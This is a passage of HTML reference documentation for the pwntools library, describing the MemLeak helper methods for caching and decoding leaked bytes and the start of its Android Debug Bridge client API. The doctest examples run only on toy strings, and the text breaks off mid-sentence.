<code class="descname">raw</code><span class="sig-paren">(</span><em>addr</em>, <em>numb</em><span class="sig-paren">)</span> &#x2192; list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L218-222"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.raw" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak <cite>numb</cite> bytes at <cite>addr</cite></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.s">
<code class="descname">s</code><span class="sig-paren">(</span><em>addr</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L317-346"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.s" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak bytes at <cite>addr</cite> until failure or a nullbyte is found</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A string, without a NULL terminator.
The returned string will be empty if the first byte is
a NULL terminator, or if the first byte could not be
retrieved.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;Hello</span><span class="se">\x00</span><span class="s2">World&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;Hello&quot;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;World&quot;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="mi">999</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.setb">
<code class="descname">setb</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L464-476"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.setb" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets byte at <code class="docutils literal"><span class="pre">((uint8_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">setb</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{</span><span class="mi">33</span><span class="p">:</span> <span class="s1">&#39;A&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.setd">
<code class="descname">setd</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L492-498"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.setd" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets dword at <code class="docutils literal"><span class="pre">((uint32_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<p>See <a class="reference internal" href="#pwnlib.memleak.MemLeak.setw" title="pwnlib.memleak.MemLeak.setw"><code class="xref py py-meth docutils literal"><span class="pre">setw()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.setq">
<code class="descname">setq</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L500-506"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.setq" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets qword at <code class="docutils literal"><span class="pre">((uint64_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<p>See <a class="reference internal" href="#pwnlib.memleak.MemLeak.setw" title="pwnlib.memleak.MemLeak.setw"><code class="xref py py-meth docutils literal"><span class="pre">setw()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.sets">
<code class="descname">sets</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>null_terminate=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L508-527"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.sets" title="Permalink to this definition">¶</a></dt>
<dd><p>Set known string at <cite>addr</cite>, which will be optionally be null-terminated</p>
<p>Note that this method is a bit dumb about how it handles the data.
It will null-terminate the data, but it will not stop at the first null.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">sets</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;H</span><span class="se">\x00</span><span class="s1">ello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{</span><span class="mi">0</span><span class="p">:</span> <span class="s1">&#39;H&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">:</span> <span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span> <span class="s1">&#39;l&#39;</span><span class="p">,</span> <span class="mi">4</span><span class="p">:</span> <span class="s1">&#39;l&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">:</span> <span class="s1">&#39;o&#39;</span><span class="p">,</span> <span class="mi">6</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.setw">
<code class="descname">setw</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L478-490"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.setw" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets word at <code class="docutils literal"><span class="pre">((uint16_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">setw</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{</span><span class="mi">33</span><span class="p">:</span> <span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="mi">34</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.struct">
<code class="descname">struct</code><span class="sig-paren">(</span><em>address</em>, <em>struct</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L102-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.struct" title="Permalink to this definition">¶</a></dt>
<dd><p>struct(address, struct) =&gt; structure object
Leak an entire structure.
:param address: Addess of structure in memory
:type address: int
:param struct: A ctypes structure to be instantiated with leaked data
:type struct: class</p>
<dl class="docutils">
<dt>Return Value:</dt>
<dd>An instance of the provided struct class, with the leaked data decoded</dd>
</dl>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nd">@pwnlib</span><span class="o">.</span><span class="n">memleak</span><span class="o">.</span><span class="n">MemLeak</span>
<span class="gp">... </span><span class="k">def</span> <span class="nf">leaker</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="s2">&quot;A&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">leaker</span><span class="o">.</span><span class="n">struct</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">elf</span><span class="o">.</span><span class="n">Elf32_Phdr</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">p_paddr</span><span class="p">)</span>
<span class="go">&#39;0x41414141&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.u16">
<code class="descname">u16</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L253-270"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.u16" title="Permalink to this definition">¶</a></dt>
<dd><p>w(addr, ndx = 0) -&gt; int</p>
<p>Leak word at <code class="docutils literal"><span class="pre">((uint16_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">w</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;ab&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">w</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;yz&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">w</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.u32">
<code class="descname">u32</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L272-289"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.u32" title="Permalink to this definition">¶</a></dt>
<dd><p>d(addr, ndx = 0) -&gt; int</p>
<p>Leak dword at <code class="docutils literal"><span class="pre">((uint32_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;wxyz&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">23</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.u64">
<code class="descname">u64</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L291-308"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.u64" title="Permalink to this definition">¶</a></dt>
<dd><p>q(addr, ndx = 0) -&gt; int</p>
<p>Leak qword at <code class="docutils literal"><span class="pre">((uint64_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;abcdefgh&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">q</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;stuvwxyz&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">q</span><span class="p">(</span><span class="mi">19</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.u8">
<code class="descname">u8</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L234-251"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.u8" title="Permalink to this definition">¶</a></dt>
<dd><p>b(addr, ndx = 0) -&gt; int</p>
<p>Leak byte at <code class="docutils literal"><span class="pre">((uint8_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">b</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">b</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">b</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.w">
<code class="descname">w</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L253-270"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.w" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak word at <code class="docutils literal"><span class="pre">((uint16_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">w</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;ab&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">w</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;yz&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">w</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</dd></dl>

</div>
<span id="document-protocols"></span><div class="section" id="module-pwnlib.protocols">
<span id="pwnlib-protocols-wire-protocols"></span><h3><a class="reference internal" href="#module-pwnlib.protocols" title="pwnlib.protocols"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.protocols</span></code></a> &#8212; Wire Protocols<a class="headerlink" href="#module-pwnlib.protocols" title="Permalink to this headline">¶</a></h3>
<div class="section" id="supported-protocols">
<h4>Supported Protocols<a class="headerlink" href="#supported-protocols" title="Permalink to this headline">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-protocols/adb"></span><div class="section" id="module-pwnlib.protocols.adb">
<span id="pwnlib-protocols-adb-adb-protocol-implementation"></span><h5><a class="reference internal" href="#module-pwnlib.protocols.adb" title="pwnlib.protocols.adb"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.protocols.adb</span></code></a> &#8212; ADB Protocol Implementation<a class="headerlink" href="#module-pwnlib.protocols.adb" title="Permalink to this headline">¶</a></h5>
<p>Implementation of the Android Debug Bridge (ADB) protocol.</p>
<p>Documentation is available <a class="reference external" href="https://android.googlesource.com/platform/system/core/+/master/adb/protocol.txt">here</a>.</p>
<dl class="class">
<dt id="pwnlib.protocols.adb.AdbClient">
<em class="property">class </em><code class="descclassname">pwnlib.protocols.adb.</code><code class="descname">AdbClient</code><span class="sig-paren">(</span><em>level=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient" title="Permalink to this definition">¶</a></dt>
<dd><p>ADB Client</p>
<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.devices">
<code class="descname">devices</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L118-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.devices" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>long</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, fetch the long-format listing.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">String representation of all available devices.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.execute">
<code class="descname">execute</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L118-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.execute" title="Permalink to this definition">¶</a></dt>
<dd><p>Executes a program on the device.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube.tube</span></code></a> which is connected to the process.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">protocols</span><span class="o">.</span><span class="n">adb</span><span class="o">.</span><span class="n">AdbClient</span><span class="p">()</span><span class="o">.</span><span class="n">execute</span><span class="p">([</span><span class="s1">&#39;echo&#39;</span><span class="p">,</span><span class="s1">&#39;hello&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.kill">
<code class="descname">kill</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L118-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.kill" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills the remote ADB server&#8221;</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">=</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">protocols</span><span class="o">.</span><span class="n">adb</span><span class="o">.</span><span class="n">AdbClient</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">kill</span><span class="p">()</span>
</pre></div>
</div>
<p>The server is automatically re-started on the next request,
if the default host/port are used.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">version</span><span class="p">()</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.protocols.adb.AdbClient.list">
<code class="descname">list</code><span class="sig-paren">(</span><em>path</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/protocols/adb.py#L343-385"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.protocols.adb.AdbClient.list" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute the <code class="docutils literal"><span class="pre">LIST</span></code> command of the <code class="docutils literal"><span class="pre">SYNC</span></code> API.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path of the directory to list.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A dictionary, where the keys are relative filenames,
and the values are a dictionary containing the same
values as <code class="docutils literal"><span class="pre">stat()</span></code> supplies.</td>
</tr>
</tbody>
</table>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p>In recent releases of Android (e.g. 7.0), the domain that
adbd executes from does not have access to everything that
the shell user does.</p>
<p>Because of this, while the shell user can get listings of
